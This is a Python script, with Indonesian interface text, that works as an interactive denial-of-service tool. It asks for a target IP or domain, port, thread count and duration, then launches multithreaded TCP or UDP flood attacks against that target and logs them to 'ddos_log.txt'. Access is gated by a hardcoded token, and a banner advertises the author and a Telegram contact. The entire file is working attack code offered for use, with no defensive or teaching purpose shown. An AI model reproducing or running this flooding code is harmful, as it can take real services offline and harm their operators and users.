import threading
import socket
import requests
import logging
import os
import subprocess
import sys
import time
from colorama import init, Fore, Style

def install_and_import(package):
    try:
        __import__(package)
        print(f"{Fore.GREEN}Modul '{package}' sudah terpasang.{Style.RESET_ALL}")
    except ImportError:
        print(f"{Fore.YELLOW}Modul '{package}' tidak ditemukan. Mengunduh dan memasang...{Style.RESET_ALL}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print(f"{Fore.GREEN}Modul '{package}' berhasil dipasang.{Style.RESET_ALL}")

install_and_import('colorama')
install_and_import('requests')
install_and_import('pysocks')

init(autoreset=True)
logging.basicConfig(filename="ddos_log.txt", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

secret_token = "JgS3nG5PvT9aUkR8zYbE2xQ6fW1oLcX4hDvFmCjKgHnNmZbYnBaWp4sUgYcTdRf"

logo = f"""
{Fore.MAGENTA}{Style.BRIGHT}

/$$$$$$$ /$$ /$$ /$$ /$$ /$$$$$$
| $$__ $$ | $$ | $$| $$ | $$ /$$__ $$
| $$ \ $$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$$| $$ | $$|__/ \ $$
| $$$$$$$//$$__ $$ /$$__ $$|_ $$_/ /$$__ $$ /$$__ $$| $$ / $$/ /$$$$$$/
| $$____/| $$ \__/| $$ \ $$ | $$ | $$ \ $$| $$ | $$ \ $$ $$/ /$$____/
| $$ | $$ | $$ | $$ | $$ /$$| $$ | $$| $$ | $$ \ $$$/ | $$      
| $$ | $$ | $$$$$$/ | $$$$/| $$$$$$/| $$$$$$$ \ $/ | $$$$$$$$
|__/ |__/ \______/ \___/ \______/ \_______/ \_/ |________/
 If you want feedback and buy me a coffee, contact • t.me/damn_boy738                                                                             
                                                                   
{Style.RESET_ALL}
"""

author_info = f"{Fore.RED}{Style.BRIGHT}Author: {Fore.WHITE}Damn Boy 404{Style.RESET_ALL}"

def tcp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_ip, target_port))
    client.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            client.sendto(b"X-a: b\r\n", (target_ip, target_port))
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {str(e)}{Style.RESET_ALL}")
            break

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = os.urandom(1024)
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            client.sendto(bytes, (target_ip, target_port))
        except Exception as e:
            print(f"{Fore.RED}[ERROR] {str(e)}{Style.RESET_ALL}")
            break

def get_ip_from_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        print(f"{Fore.RED}[ERROR] Domain tidak valid atau tidak dapat ditemukan.{Style.RESET_ALL}")
        logging.error("Domain tidak valid atau tidak dapat ditemukan.")
        return None

def check_website_status(target_ip):
    try:
        response = requests.get(f"http://{target_ip}")
        status_code = response.status_code
        if status_code == 200:
            print(f"{Fore.GREEN}Website {target_ip} is up. Status code: {status_code}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Website {target_ip} is reachable but returned status code: {status_code}{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[ERROR] Cannot reach website {target_ip}: {str(e)}{Style.RESET_ALL}")
        logging.error(f"Cannot reach website {target_ip}: {str(e)}")

def login():
    os.system('clear')
    print(logo)
    print("Masukkan token rahasia untuk mengakses skrip ini.")
    token = input("Token: ")
    if token == secret_token:
        print(f"{Fore.GREEN}Otentikasi berhasil!{Style.RESET_ALL}")
        main()
    else:
        print(f"{Fore.RED}Token salah! Akses ditolak.{Style.RESET_ALL}")
        sys.exit()

def main():
    while True:
        os.system('clear')
        print(logo)
        print(author_info)
        target = input(f"{Fore.YELLOW}Masukkan IP atau Domain Target: {Style.RESET_ALL}")
        if target.startswith("http"):
            print(f"{Fore.RED}[ERROR] Masukkan hanya domain atau IP, tanpa http/https.{Style.RESET_ALL}")
            continue
        target_ip = get_ip_from_domain(target) if not target.replace('.', '').isdigit() else target
        if not target_ip:
            continue
        check_website_status(target_ip)
        try:
            target_port = int(input(f"{Fore.YELLOW}Masukkan Port Target: {Style.RESET_ALL}"))
            num_threads = int(input(f"{Fore.YELLOW}Masukkan Jumlah Threads: {Style.RESET_ALL}"))
            duration = int(input(f"{Fore.YELLOW}Masukkan Durasi Serangan (detik): {Style.RESET_ALL}"))
            attack_type = input(f"{Fore.YELLOW}Masukkan Tipe Serangan (TCP/UDP): {Style.RESET_ALL}").upper()

            if duration <= 0:
                print(f"{Fore.RED}[ERROR] Durasi harus lebih besar dari 0{Style.RESET_ALL}")
                logging.error("Durasi harus lebih besar dari 0")
                continue

            if attack_type not in ["TCP", "UDP"]:
                print(f"{Fore.RED}[ERROR] Tipe serangan tidak valid. Pilih 'TCP' atau 'UDP'.{Style.RESET_ALL}")
                logging.error("Tipe serangan tidak valid. Pilih 'TCP' atau 'UDP'.")
                continue

            os.system('clear')
            print(logo)
            print(author_info)
            print(f"{Fore.YELLOW}Memulai serangan {attack_type} ke {target_ip}:{target_port} selama {duration} detik...{Style.RESET_ALL}")

            threads = []
            for _ in range(num_threads):
                if attack_type == "TCP":
                    thread = threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration))
                else:
                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            print(f"{Fore.GREEN}[SELESAI] Serangan {attack_type} ke {target_ip}:{target_port} selesai.{Style.RESET_ALL}")
            logging.info(f"Serangan {attack_type} ke {target_ip}:{target_port} selesai.")

        except ValueError:
            print(f"{Fore.RED}[ERROR] Masukan tidak valid. Pastikan untuk memasukkan angka yang benar.{Style.RESET_ALL}")
            logging.error("Masukan tidak valid. Pastikan untuk memasukkan angka yang benar.")
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[INFO] Serangan dihentikan oleh pengguna.{Style.RESET_ALL}")
            logging.info("Serangan dihentikan oleh pengguna.")
            break

if __name__ == "__main__":
    login()